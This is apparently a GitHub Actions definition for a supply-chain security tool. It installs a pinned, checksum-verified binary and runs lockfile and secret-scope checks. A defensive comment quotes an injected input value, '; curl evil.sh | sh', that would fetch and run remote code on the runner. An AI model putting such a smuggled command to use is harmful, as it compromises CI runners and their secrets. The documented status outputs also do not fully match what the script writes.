name: 'Supply Chain Guardian'
description: 'Enforce dependency integrity and secret least-privilege in CI/CD pipelines'
author: "data-insights-ai"

branding:
  icon: 'shield'
  color: 'green'

inputs:
  mode:
    description: 'Operation mode: check (validate lockfile), scope (audit secrets for step), init (create lockfile), audit (full report)'
    required: true
  step-name:
    description: 'Step name for scope mode'
    required: false
    default: ''
  lockfile:
    description: 'Path to scg.lock file'
    required: false
    default: 'scg.lock'
  workflows:
    description: 'Workflow directory to scan'
    required: false
    default: '.github/workflows'
  sanitize:
    description: 'In scope mode, actually remove forbidden secrets from environment'
    required: false
    default: 'false'
  json:
    description: 'Output results as JSON'
    required: false
    default: 'false'
  timeout:
    description: >-
      Overall time limit for the SCG run, e.g. 90s or 5m. Defaults to 5m. A
      platform that stops responding then fails the step promptly with exit
      code 2 instead of burning the job's own timeout.
    required: false
    default: ''
  sarif:
    description: >-
      In check mode, write findings to this path as SARIF so they appear in the
      repository's Security tab rather than only in the job log. Upload it with
      github/codeql-action/upload-sarif.
    required: false
    default: ''
  watch:
    description: >-
      In init mode, upload the signed lockfile afterwards so the platform
      watches its tools for this repository. Needs SCG_API_KEY in the
      environment.
    required: false
    default: 'false'
  repo:
    description: >-
      Repository name for watch (defaults to GITHUB_REPOSITORY).
    required: false
    default: ''
  version:
    description: >-
      SCG version to install, e.g. v0.1.32. Defaults to the version this action
      was released with, so the action is itself pinned rather than pulling
      whatever "latest" happens to be at the time it runs.
    required: false
    default: ''

outputs:
  status:
    description: 'Result status: ok, drift_detected, violations_found, operational_failure'
  exit-code:
    description: 'SCG exit code: 0=clean, 1=finding, 2=operational failure'

runs:
  using: 'composite'
  steps:
    - name: Install SCG
      shell: bash
      # Inputs reach the script through env, never through ${{ }} interpolation
      # into the script body. Interpolated inputs are substituted before bash
      # ever sees them, so a value like `; curl evil.sh | sh` from an issue
      # title or a matrix entry becomes a command on the runner.
      env:
        SCG_VERSION: ${{ inputs.version }}
        SCG_DEFAULT_VERSION: ${{ github.action_ref }}
      run: |
        set -euo pipefail

        VERSION="${SCG_VERSION:-}"
        if [ -z "$VERSION" ]; then
          VERSION="${SCG_DEFAULT_VERSION:-}"
        fi
        if [ -z "$VERSION" ] || [ "$VERSION" = "latest" ]; then
          echo "::error::Refusing to install an unpinned SCG version. Set the 'version' input to a released tag (e.g. v0.1.32)."
          exit 1
        fi

        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
        ARCH=$(uname -m)
        case "$ARCH" in
          x86_64|amd64) ARCH="amd64" ;;
          aarch64|arm64) ARCH="arm64" ;;
          *) echo "::error::Unsupported architecture: $ARCH"; exit 1 ;;
        esac

        BINARY="scg-${OS}-${ARCH}"
        BASE="https://github.com/data-insights-ai/rho-scg/releases/download/${VERSION}"
        TMP=$(mktemp -d)
        trap 'rm -rf "$TMP"' EXIT

        echo "::group::Install SCG ${VERSION}"

        # Integrity verification is mandatory. A supply chain tool that installs
        # itself from an unverified download is the exact failure it exists to
        # prevent, so every branch below exits rather than continuing.
        if ! curl -sSfL --retry 3 -o "$TMP/$BINARY" "$BASE/$BINARY"; then
          echo "::error::Failed to download SCG from $BASE/$BINARY"
          exit 1
        fi
        if ! curl -sSfL --retry 3 -o "$TMP/checksums.txt" "$BASE/checksums.txt"; then
          echo "::error::Failed to download checksums.txt. Refusing to install an unverified binary."
          exit 1
        fi

        EXPECTED=$(grep " ${BINARY}\$" "$TMP/checksums.txt" | awk '{print $1}' | head -1)
        if [ -z "$EXPECTED" ]; then
          echo "::error::No checksum published for ${BINARY}. Refusing to install."
          exit 1
        fi

        if command -v sha256sum >/dev/null 2>&1; then
          ACTUAL=$(sha256sum "$TMP/$BINARY" | awk '{print $1}')
        elif command -v shasum >/dev/null 2>&1; then
          ACTUAL=$(shasum -a 256 "$TMP/$BINARY" | awk '{print $1}')
        else
          echo "::error::Neither sha256sum nor shasum is available. Cannot verify the download."
          exit 1
        fi

        if [ "$ACTUAL" != "$EXPECTED" ]; then
          echo "::error::Checksum mismatch for ${BINARY}. Expected ${EXPECTED}, got ${ACTUAL}."
          exit 1
        fi
        echo "Checksum verified: ${ACTUAL}"

        install -m 0755 "$TMP/$BINARY" /usr/local/bin/scg
        scg version
        echo "::endgroup::"

    - name: Run SCG
      id: scg
      shell: bash
      env:
        SCG_MODE: ${{ inputs.mode }}
        SCG_STEP_NAME: ${{ inputs.step-name }}
        SCG_LOCKFILE: ${{ inputs.lockfile }}
        SCG_WORKFLOWS: ${{ inputs.workflows }}
        SCG_SANITIZE: ${{ inputs.sanitize }}
        SCG_JSON: ${{ inputs.json }}
        SCG_SARIF: ${{ inputs.sarif }}
        SCG_TIMEOUT: ${{ inputs.timeout }}
        SCG_WATCH: ${{ inputs.watch }}
        SCG_WATCH_REPO: ${{ inputs.repo }}
      run: |
        set -uo pipefail

        # Arguments are built as an array, so a value containing spaces or shell
        # metacharacters stays a single argument instead of being re-split.
        ARGS=()
        case "$SCG_MODE" in
          check)
            ARGS=(check --lockfile "$SCG_LOCKFILE")
            if [ -n "$SCG_SARIF" ]; then
              ARGS+=(--sarif "$SCG_SARIF")
            fi
            ;;
          scope)
            if [ -z "$SCG_STEP_NAME" ]; then
              echo "::error::step-name is required for scope mode"
              exit 1
            fi
            ARGS=(scope --step "$SCG_STEP_NAME" --workflows "$SCG_WORKFLOWS")
            if [ "$SCG_SANITIZE" = "true" ]; then
              ARGS+=(--sanitize)
            fi
            ;;
          init)
            ARGS=(init --lockfile "$SCG_LOCKFILE" --workflows "$SCG_WORKFLOWS")
            if [ "$SCG_WATCH" = "true" ]; then
              ARGS+=(--watch)
              if [ -n "$SCG_WATCH_REPO" ]; then
                ARGS+=(--repo "$SCG_WATCH_REPO")
              fi
            fi
            ;;
          audit)
            ARGS=(audit --lockfile "$SCG_LOCKFILE" --workflows "$SCG_WORKFLOWS")
            ;;
          *)
            echo "::error::Unknown mode: $SCG_MODE (use check, scope, init, or audit)"
            exit 1
            ;;
        esac

        if [ "$SCG_JSON" = "true" ]; then
          ARGS+=(--json)
        fi
        if [ -n "$SCG_TIMEOUT" ] && [ "$SCG_MODE" != "scope" ]; then
          ARGS+=(--timeout "$SCG_TIMEOUT")
        fi

        echo "::group::SCG $SCG_MODE"
        EXIT_CODE=0
        scg "${ARGS[@]}" || EXIT_CODE=$?
        echo "::endgroup::"

        echo "exit-code=$EXIT_CODE" >> "$GITHUB_OUTPUT"

        # Exit code 2 is an SCG operational failure — the platform was
        # unreachable, rate limited, or its data was stale. It says nothing
        # about the caller's dependencies, so it is surfaced as a warning
        # annotation rather than an error that reads like a detection.
        case "$EXIT_CODE" in
          0)
            echo "status=ok" >> "$GITHUB_OUTPUT"
            ;;
          2)
            echo "status=operational_failure" >> "$GITHUB_OUTPUT"
            echo "::warning::SCG could not complete the check (operational failure, not a finding). Nothing was detected about your dependencies."
            exit 2
            ;;
          *)
            echo "status=issues_found" >> "$GITHUB_OUTPUT"
            exit "$EXIT_CODE"
            ;;
        esac
